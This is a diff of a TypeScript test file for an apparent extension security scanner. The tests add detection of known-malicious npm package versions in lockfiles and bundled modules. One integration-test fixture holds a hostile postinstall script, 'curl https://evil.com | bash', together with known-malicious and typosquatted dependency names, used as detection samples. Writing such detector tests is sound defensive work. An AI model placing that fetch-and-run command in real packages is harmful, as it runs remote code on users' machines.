@@ -1,10 +1,17 @@
 import { describe, expect, it } from "vitest";
-import type { BlocklistEntry, VsixContents, VsixManifest, ZooData } from "../types.js";
+import type {
+  BlocklistEntry,
+  MaliciousNpmVersionAdvisory,
+  VsixContents,
+  VsixManifest,
+  ZooData,
+} from "../types.js";
 import {
   checkActivationEvents,
   checkBlocklist,
   checkLifecycleScripts,
   checkMaliciousPackages,
+  checkMaliciousPackageVersions,
   checkPackage,
   checkThemeAbuse,
   checkTyposquattingPackages,
@@ -19,6 +26,7 @@ function makePackageJson(content: object): string {
 function makeContents(
   packageJsonContent: object,
   manifestOverrides: Partial<VsixManifest> = {},
+  extraFiles: Record<string, string> = {},
 ): VsixContents {
   const manifest: VsixManifest = {
     name: "test-extension",
@@ -29,17 +37,51 @@ function makeContents(
 
   const files = new Map<string, Buffer>();
   files.set("package.json", Buffer.from(makePackageJson(packageJsonContent), "utf8"));
+  for (const [filename, content] of Object.entries(extraFiles)) {
+    files.set(filename, Buffer.from(content, "utf8"));
+  }
 
   return { manifest, files, basePath: "/test" };
 }
 
-function makeZooData(maliciousPackages: string[] = []): ZooData {
+function makeVersionAdvisory(
+  name: string,
+  affectedVersions: string[],
+): MaliciousNpmVersionAdvisory {
+  return {
+    name: name.toLowerCase(),
+    affectedVersions,
+    advisory: "TEST-ADVISORY",
+    campaign: "UnitTest",
+    reason: "Known malicious test package version",
+    references: ["https://example.test/advisory"],
+  };
+}
+
+function makeAdvisoryMap(
+  advisories: MaliciousNpmVersionAdvisory[],
+): Map<string, MaliciousNpmVersionAdvisory[]> {
+  const result = new Map<string, MaliciousNpmVersionAdvisory[]>();
+  for (const advisory of advisories) {
+    const key = advisory.name.toLowerCase();
+    const existing = result.get(key) ?? [];
+    existing.push({ ...advisory, name: key });
+    result.set(key, existing);
+  }
+  return result;
+}
+
+function makeZooData(
+  maliciousPackages: string[] = [],
+  maliciousVersionAdvisories: MaliciousNpmVersionAdvisory[] = [],
+): ZooData {
   return {
     blocklist: [],
     hashes: new Set(),
     domains: new Set(),
     ips: new Set(),
     maliciousNpmPackages: new Set(maliciousPackages.map((p) => p.toLowerCase())),
+    maliciousNpmVersions: makeAdvisoryMap(maliciousVersionAdvisories),
     wallets: new Set(),
     blockchainAllowlist: new Set(),
     telemetryServices: new Map(),
@@ -318,6 +360,212 @@ describe("checkMaliciousPackages", () => {
   });
 });
 
+describe("checkMaliciousPackageVersions", () => {
+  it("detects exact malicious versions from package-lock v3 packages", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "": { name: "test", version: "1.0.0" },
+            "node_modules/debug": { version: "4.4.2" },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.id).toBe("MALICIOUS_NPM_PACKAGE_VERSION");
+    expect(findings[0]?.severity).toBe("critical");
+    expect(findings[0]?.location?.file).toBe("package-lock.json");
+    expect(findings[0]?.metadata?.["package"]).toBe("debug");
+    expect(findings[0]?.metadata?.["version"]).toBe("4.4.2");
+    expect(findings[0]?.metadata?.["evidenceSource"]).toBe("package-lock");
+  });
+
+  it("does not flag patched versions of compromised package names", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "node_modules/debug": { version: "4.4.3" },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(0);
+  });
+
+  it("detects scoped malicious versions from package-lock v3 packages", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "node_modules/@nx/devkit": { version: "21.5.0" },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("@nx/devkit", ["20.9.0", "21.5.0"])]),
+    );
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.metadata?.["package"]).toBe("@nx/devkit");
+    expect(findings[0]?.metadata?.["version"]).toBe("21.5.0");
+  });
+
+  it("ignores dev-only package-lock entries unless the package is bundled", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "node_modules/debug": { version: "4.4.2", dev: true },
+            "node_modules/chalk": { version: "5.6.1", devOptional: true },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([
+        makeVersionAdvisory("debug", ["4.4.2"]),
+        makeVersionAdvisory("chalk", ["5.6.1"]),
+      ]),
+    );
+
+    expect(findings).toHaveLength(0);
+  });
+
+  it("detects malicious versions from bundled node_modules package manifests", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "node_modules/debug": { version: "4.4.2", dev: true },
+          },
+        }),
+        "node_modules/debug/package.json": makePackageJson({
+          name: "debug",
+          version: "4.4.2",
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.location?.file).toBe("node_modules/debug/package.json");
+    expect(findings[0]?.metadata?.["evidenceSource"]).toBe("bundled-node-module");
+  });
+
+  it("detects malicious versions from package-lock v1 dependencies", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 1,
+          dependencies: {
+            wrapper: {
+              version: "1.0.0",
+              dependencies: {
+                debug: { version: "4.4.2" },
+              },
+            },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.metadata?.["evidenceSource"]).toBe("package-lock-v1");
+  });
+
+  it("skips dev-only package-lock v1 dependency subtrees", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 1,
+          dependencies: {
+            devtool: {
+              version: "1.0.0",
+              dev: true,
+              dependencies: {
+                debug: { version: "4.4.2" },
+              },
+            },
+          },
+        }),
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(0);
+  });
+
+  it("emits a low-severity finding when lockfile JSON cannot be parsed", () => {
+    const contents = makeContents(
+      { name: "test" },
+      {},
+      {
+        "package-lock.json": "not valid json",
+      },
+    );
+
+    const findings = checkMaliciousPackageVersions(
+      contents,
+      makeAdvisoryMap([makeVersionAdvisory("debug", ["4.4.2"])]),
+    );
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.id).toBe("PARSE_FAILURE_PACKAGE_LOCK");
+    expect(findings[0]?.severity).toBe("low");
+  });
+});
+
 describe("checkTyposquattingPackages", () => {
   it("detects known typosquats", () => {
     const packageJson = {
@@ -573,21 +821,33 @@ describe("checkPackage (integration)", () => {
   });
 
   it("runs all checks on a malicious package.json", () => {
-    const contents = makeContents({
-      name: "evil-extension",
-      dependencies: {
-        "event-stream": "^3.3.4", // Known malicious
-        lodahs: "^4.0.0", // Typosquat
+    const contents = makeContents(
+      {
+        name: "evil-extension",
+        dependencies: {
+          "event-stream": "^3.3.4", // Known malicious
+          lodahs: "^4.0.0", // Typosquat
+        },
+        scripts: {
+          postinstall: "curl https://evil.com | bash", // Malicious script
+        },
       },
-      scripts: {
-        postinstall: "curl https://evil.com | bash", // Malicious script
+      {},
+      {
+        "package-lock.json": makePackageJson({
+          lockfileVersion: 3,
+          packages: {
+            "node_modules/debug": { version: "4.4.2" },
+          },
+        }),
       },
-    });
+    );
 
-    const zooData = makeZooData(["event-stream"]);
+    const zooData = makeZooData(["event-stream"], [makeVersionAdvisory("debug", ["4.4.2"])]);
     const findings = checkPackage(contents, zooData);
 
     expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
+    expect(findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE_VERSION")).toBe(true);
     expect(findings.some((f) => f.id === "TYPOSQUAT_PACKAGE")).toBe(true);
     expect(findings.some((f) => f.id === "MALICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
   });
